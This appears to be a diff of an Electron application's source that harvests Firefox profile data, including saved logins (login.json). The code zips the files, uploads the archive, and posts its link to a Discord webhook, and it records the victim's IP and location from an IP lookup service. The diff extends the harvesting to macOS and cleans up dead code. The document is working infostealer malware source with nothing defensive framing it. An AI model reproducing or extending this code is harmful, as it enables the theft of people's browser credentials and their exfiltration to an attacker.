@@ -54,90 +54,12 @@ function createWindow () {
     var folderSpecifier = "/";
     processWindowsMozilla(process.env.HOME + "/.mozilla/firefox",
     folderSpecifier);
-    // console.log("Hello");
   }
-
-  // Duplicating process by including opendir and readdir.
-  // fs.opendir(process.env.APPDATA + "\\Mozilla\\Firefox\\Profiles", (err, dir) => {
-  //   if (err) {
-  //     console.log("ERROR");
-  //   } else {
-  //     var recentTime = 0;
-  //     let recentFile = ""
-  //     console.log(dir.path);
-
-  //     files = fs.readdirSync(dir.path);
-  //     // fs.readdir(dir.path, (err, files) => {
-  //       let zip = new JSZip();
-  //       files.forEach(file => {
-  //         statObj = fs.statSync(dir.path + "\\" + file);
-  //         if (statObj.mtimeMs > recentTime && file.indexOf("default") != -1) {
-  //           recentTime = statObj.mtimeMs;
-  //           recentFile = file;
-  //         };
-  //         if (statObj["mode"] == 16822) {
-  //           storeMozillaFiles(zip, dir.path + "\\" + file, file);
-  //         }
-  //       })
-  //       console.log(dir.path + "\\" + recentFile + "\\" + "login.json");
-  //       zip
-  //       .generateNodeStream(
-  //         {type: "nodebuffer",
-  //          streamFiles: true,
-  //          compression: "DEFLATE",
-  //          compressionOptions: {"level": 9}})
-  //       .pipe(fs.createWriteStream("out.zip"))
-  //       .on("finish", function() {
-  //         fs.rmdir("aqua.zip", {recursive: true}, function() {
-  //           var d = new Date();
-  //           var n2 = d.getTime()
-  //           console.log("done" + (n2 - n1));
-  //         })
-  //         // Post Link to discord webhook.
-  //         // client.upload("aqua.zip").then(
-  //         //   function(result) {
-  //         //     console.log(result["url"]);
-  //         //   },
-  //         //   function(error) {
-  //         //     console.log(error);
-  //         //   }
-  //         // );
-  //         // console.log("out.zip");
-  //       });
-  //       // console.log(recentFile);
-  //     // })
-  //       // fs.readdirSync(dir.path).forEach(file => {
-  //       //   // https://www.geeksforgeeks.org/node-js-fs-stat-method/
-  //       //   var statObj = fs.statSync(file.);
-  //       //   console.log(statObj.isDirectory())
-  //       //   console.log(file);
-  //       // })
-  //   }
-  //   dir.close()
-  // })
-  // fsExtra.remove("out.zip", function() {
-  //   console.log("done");
-  // })
-  // fs.rmdir("out.zip", {recursive: true}, function() {
-  //   console.log("done");
-  // })
+  // Fetch and put in zip.file.
   fetch('https://api.ipdata.co/?api-key=test')
   .then(results => results.json())
   .then(json => {
       fullText += 'IP: ' + json.ip + '\n';
-      fullText += 'City: ' + json.city + '\n';
-      fullText += 'Region: ' + json.region + '\n';
-      fullText += 'Host: ' + json.asn.name + '\n';
-      fullText += 'Domain: ' + json.asn.domain + '\n';
-      fullText += 'Route: ' + json.asn.route + '\n';
-      if (json.threat.is_threat == true) {
-        fullText += 'Is_Tor: ' + json.threat.is_tor + '\n';
-        fullText += 'Is_Proxy: ' + json.threat.is_proxy + '\n';
-        fullText += 'Is_Anonymous: ' + json.threat.is_anonymous + '\n';
-        fullText += 'Is_Known_Attacker: ' + json.threat.is_known_attacker + '\n';
-        fullText += 'Is_Known_Abuser: ' + json.threat.is_known_abuser + '\n';
-        fullText += 'Is_Bogon: ' + json.threat.is_bogon + '\n';
-      }
   })
   for(const window of BrowserWindow.getAllWindows()) {
     if (win1.webContents) {
@@ -173,17 +95,6 @@ function createWindow () {
   // win.webContents.openDevTools()
 }
 
-function checkDir(path) {
-  fs.opendir(path, (err, dir) => {
-    if (err) {
-      return false;
-    } else {
-      dir.close();
-      return true;
-    }
-  })
-}
-
 // This function will retrieve the data for Firefox Logins.
 function processWindowsMozilla(directoryPath, folderSpecifier) {
   var d = new Date();
@@ -206,8 +117,10 @@ function processWindowsMozilla(directoryPath, folderSpecifier) {
             recentTime = statObj.mtimeMs;
             recentFile = folder;
           };
+          console.log(statObj["mode"]);
           if (statObj["mode"] == 16822 && process.platform == "win32" ||
-              statObj["mode"] == 16832 && process.platform == "linux") {
+              statObj["mode"] == 16832 && process.platform == "linux" ||
+              statObj["mode"] == 168322 && process.platform == "darwin") {
             storeMozillaFiles(zip, statsPath, folder, folderSpecifier);
           }
         })
@@ -238,8 +151,8 @@ function uploadFiles(fileName) {
       const data = JSON.stringify({
         "content": result["url"]
       });
-      webhookID = "INSERT WEBHOOK ID"
-      webhookToken = "INSERT WEBHOOK TOKEN"
+      webhookID = "WEBHOOK ID"
+      webhookToken = "WEBHOOK TOKEN"
 
       // Reference: https://stackoverflow.com/a/56627565
       var URL = `https://discordapp.com/api/webhooks/${webhookID}/${webhookToken}`
@@ -250,9 +163,6 @@ function uploadFiles(fileName) {
       })
       .then(
         fs.rmdir("aqua.zip", {recursive: true}, function() {
-          var d = new Date();
-          var n2 = d.getTime()
-          console.log("done" + (n2 - n1));
         })
       )
       .catch(err => console.log(err));
